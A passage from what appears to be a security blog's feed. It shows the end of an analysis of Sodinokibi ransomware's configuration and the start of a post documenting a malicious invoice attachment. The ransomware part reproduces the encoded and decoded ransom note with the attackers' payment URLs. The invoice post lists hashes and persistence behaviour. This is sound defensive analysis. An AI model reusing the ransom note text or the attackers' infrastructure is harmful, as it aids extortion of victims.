GIAKQAgAE8AcABlAG4AIABvAHUAcgAgAHMAZQBjAG8AbgBkAGEAcgB5ACAAdwBlAGIAcwBpAHQAZQA6ACAAaAB0AHQAcAA6AC8ALwBkAGUAYwByAHkAcAB0AG8AcgAuAHQAbwBwAC8AewBVAEkARAB9AA0ACgANAAoAVwBhAHIAbgBpAG4AZwA6ACAAcwBlAGMAbwBuAGQAYQByAHkAIAB3AGUAYgBzAGkAdABlACAAYwBhAG4AIABiAGUAIABiAGwAbwBjAGsAZQBkACwAIAB0AGgAYQB0AHMAIAB3AGgAeQAgAGYAaQByAHMAdAAgAHYAYQByAGkAYQBuAHQAIABtAHUAYwBoACAAYgBlAHQAdABlAHIAIABhAG4AZAAgAG0AbwByAGUAIABhAHYAYQBpAGwAYQBiAGwAZQAuAA0ACgANAAoAVwBoAGUAbgAgAHkAbwB1ACAAbwBwAGUAbgAgAG8AdQByACAAdwBlAGIAcwBpAHQAZQAsACAAcAB1AHQAIAB0AGgAZQAgAGYAbwBsAGwAbwB3AGkAbgBnACAAZABhAHQAYQAgAGkAbgAgAHQAaABlACAAaQBuAHAAdQB0ACAAZgBvAHIAbQA6AA0ACgBLAGUAeQA6AA0ACgANAAoAewBLAEUAWQB9AA0ACgANAAoADQAKAEUAeAB0AGUAbgBzAGkAbwBuACAAbgBhAG0AZQA6AA0ACgANAAoAewBFAFgAVAB9AA0ACgANAAoALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAA0ACgANAAoAIQAhACEAIABEAEEATgBHAEUAUgAgACEAIQAhAA0ACgBEAE8ATgBUACAAdAByAHkAIAB0AG8AIABjAGgAYQBuAGcAZQAgAGYAaQBsAGUAcwAgAGIAeQAgAHkAbwB1AHIAcwBlAGwAZgAsACAARABPAE4AVAAgAHUAcwBlACAAYQBuAHkAIAB0AGgAaQByAGQAIABwAGEAcgB0AHkAIABzAG8AZgB0AHcAYQByAGUAIABmAG8AcgAgAHIAZQBzAHQAbwByAGkAbgBnACAAeQBvAHUAcgAgAGQAYQB0AGEAIABvAHIAIABhAG4AdABpAHYAaQByAHUAcwAgAHMAbwBsAHUAdABpAG8AbgBzACAALQAgAGkAdABzACAAbQBhAHkAIABlAG4AdABhAGkAbAAgAGQAYQBtAGcAZQAgAG8AZgAgAHQAaABlACAAcAByAGkAdgBhAHQAZQAgAGsAZQB5ACAAYQBuAGQALAAgAGEAcwAgAHIAZQBzAHUAbAB0ACwAIABUAGgAZQAgAEwAbwBzAHMAIABhAGwAbAAgAGQAYQB0AGEALgANAAoAIQAhACEAIAAhACEAIQAgACEAIQAhAA0ACgBPAE4ARQAgAE0ATwBSAEUAIABUAEkATQBFADoAIABJAHQAcwAgAGkAbgAgAHkAbwB1AHIAIABpAG4AdABlAHIAZQBzAHQAcwAgAHQAbwAgAGcAZQB0ACAAeQBvAHUAcgAgAGYAaQBsAGUAcwAgAGIAYQBjAGsALgAgAEYAcgBvAG0AIABvAHUAcgAgAHMAaQBkAGUALAAgAHcAZQAgACgAdABoAGUAIABiAGUAcwB0ACAAcwBwAGUAYwBpAGEAbABpAHMAdABzACkAIABtAGEAawBlACAAZQB2AGUAcgB5AHQAaABpAG4AZwAgAGYAbwByACAAcgBlAHMAdABvAHIAaQBuAGcALAAgAGIAdQB0ACAAcABsAGUAYQBzAGUAIABzAGgAbwB1AGwAZAAgAG4AbwB0ACAAaQBuAHQAZQByAGYAZQByAGUALgANAAoAIQAhACEAIAAhACEAIQAgACEAIQAhAAAA",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "nname":"{EXT}-readme.txt",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "exp":false,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "img":"QQBsAGwAIABvAGYAIAB5AG8AdQByACAAZgBpAGwAZQBzACAAYQByAGUAIABlAG4AYwByAHkAcAB0AGUAZAAhAA0ACgANAAoARgBpAG4AZAAgAHsARQBYAFQAfQAtAHIAZQBhAGQAbQBlAC4AdAB4AHQAIABhAG4AZAAgAGYAbwBsAGwAbwB3ACAAaQBuAHMAdAB1AGMAdABpAG8AbgBzAAAA",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "arn":false</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>What are the contents of <code>nbody</code> and <code>img</code>? Thats simple:</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="nbody">nbody<a class="hash-link" aria-label="Direct link to nbody" title="Direct link to nbody" href="https://janstarke.github.io/blog/2020/01/08/does-sodinokibi-use-bad-crypto#nbody">​</a></h2>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">---=== Welcome. Again. ===---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Whats Happen? [+]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Your files are encrypted, and currently unavailable. You can check it: all files on your system has extension {EXT}.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">By the way, everything is possible to recover (restore), but you need to follow our instructions. Otherwise, you cant return your data (NEVER).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] What guarantees? [+]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Its just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will not cooperate with us. Its not in our interests.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">To check the ability of returning files, You should go to our website. There you can decrypt one file for free. That is our guarantee.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">If you will not cooperate with our service - for us, its does not matter. But you will lose your time and data, cause just we have the private key. In practise - time is much more valuable than money.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] How to get access on website? [+]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You have two ways:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1) [Recommended] Using a TOR browser!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">a) Download and install TOR browser from this site: https://torproject.org/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b) Open our website: http://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/{UID}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2) If TOR blocked in your country, try to use VPN! But you can use our secondary website. For this:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">a) Open your any browser (Chrome, Firefox, Opera, IE, Edge)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b) Open our secondary website: http://decryptor.top/{UID}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Warning: secondary website can be blocked, thats why first variant much better and more available.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">When you open our website, put the following data in the input form:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Key:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{KEY}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Extension name:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{EXT}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-----------------------------------------------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">!!! DANGER !!!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DONT try to change files by yourself, DONT use any third party software for restoring your data or antivirus solutions - its may entail damge of the private key and, as result, The Loss all data.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">!!! !!! !!!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ONE MORE TIME: Its in your interests to get your files back. From our side, we (the best specialists) make everything for restoring, but please should not interfere.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">!!! !!! !!!</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="img">img<a class="hash-link" aria-label="Direct link to img" title="Direct link to img" href="https://janstarke.github.io/blog/2020/01/08/does-sodinokibi-use-bad-crypto#img">​</a></h2>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">All of your files are encrypted!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Find {EXT}-readme.txt and follow instuctions</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="bad-crypto">Bad crypto<a class="hash-link" aria-label="Direct link to Bad crypto" title="Direct link to Bad crypto" href="https://janstarke.github.io/blog/2020/01/08/does-sodinokibi-use-bad-crypto#bad-crypto">​</a></h2>
<p>In my eyes, the interesting part of the section is the following entry:</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">"pk":"3sB5vqBW0kuO3Nr56Ql+TMjaDchoEjxcKxBA/XbSJks="</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The value of this entry (which is 256 bits large) is decoded and stored as a global static variable at <code>0x00??DBA0</code> (the address may be different on your system at the position that I marked with ??). Unfortunately, I was not able to spot further read or write accesses to this address, but I'm working on it.</p>
<h1>Other traces</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="file-size">File size<a class="hash-link" aria-label="Direct link to File size" title="Direct link to File size" href="https://janstarke.github.io/blog/2020/01/08/does-sodinokibi-use-bad-crypto#file-size">​</a></h2>
<p>All encrypted files have the same size as their unencrypted pendants. This means:</p>
<ul>
<li>some kind of stream cipher is being used, such as AES-CTR or AES-GCM</li>
<li>there are no meta information stored in the files</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="domains">Domains<a class="hash-link" aria-label="Direct link to Domains" title="Direct link to Domains" href="https://janstarke.github.io/blog/2020/01/08/does-sodinokibi-use-bad-crypto#domains">​</a></h2>
<p>The entry dmn contains a list of domains, which may be compromised and may be used to spread malware. So I filed a claim and sent the full list to the police. Let's see if they can inform all potential victim. However, you should for now at least log accesses to the mentioned sites.</p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[New Malware: "Pro InvoiceWMZ45445"]]></title>
        <id>https://janstarke.github.io/blog/2015/12/01/new-malware-pro-invoicewmz45445</id>
        <link href="https://janstarke.github.io/blog/2015/12/01/new-malware-pro-invoicewmz45445"/>
        <updated>2015-12-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[During the last few days I received two mails with the following attachment:]]></summary>
        <content type="html"><![CDATA[<p>During the last few days I received two mails with the following attachment:</p>
<p><code>Pro InvoiceWMZ45445.rar</code></p>
<p>which contains an .exe file with the same name:</p>
<p><img decoding="async" loading="lazy" alt="ProInvoice1" src="data:image/png;base64,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" width="586" height="73" class="img_ev3q"></p>
<p>&nbsp;</p>
<p><strong>Metadata&nbsp;<strong>of <code>Pro InvoiceWMZ45445.exe</code>:</strong></strong></p>
<ul>
<li>MD5:&nbsp;<code>4EE08155DB928C449EDEA28D6A68B8CA</code></li>
<li>SHA1:&nbsp;<code>6F57853E8788E2BD8E1433D8B2E1A701774593A4</code></li>
<li>File Version:&nbsp;<code>1.0.0.1</code></li>
<li>File Description: <code>TODO: &lt;File description&gt;</code></li>
<li>Created with:&nbsp;<code>Microsoft Visual C++ ver. 8.0 [DEBUG] / Visual Studio 2005</code></li>
</ul>
<p><strong>Indicators of Compromise (IOC) of <code>Pro InvoiceWMZ45445.exe</code>:</strong></p>
<p>Upon execution, the file does the following:</p>
<ul>
<li>wait 30 seconds</li>
<li>create a file <code>sample.exe</code> under <code>%AppData%RoamingNew folder</code></li>
<li>starts the previously created file</li>
<li>installs the <code>sample.exe</code> under <code>HKCUSoftwareMicrosoftWindowsCurrentVersionRunSample (Autostart)</code></li>
<li>changes some Internet Explorer Setting</li>
</ul>
<p><img decoding="async" loading="lazy" alt="procdot" src="https://janstarke.github.io/assets/images/procdot-ce3aa1c066ee90e11b7ea974c14e423f.png" width="2587" height="685" class="img_ev3q"></p>
<p>&nbsp;</p>
<p><strong>Metadata&nbsp;<strong>of <code>sample.exe</code>:</strong></strong></p>
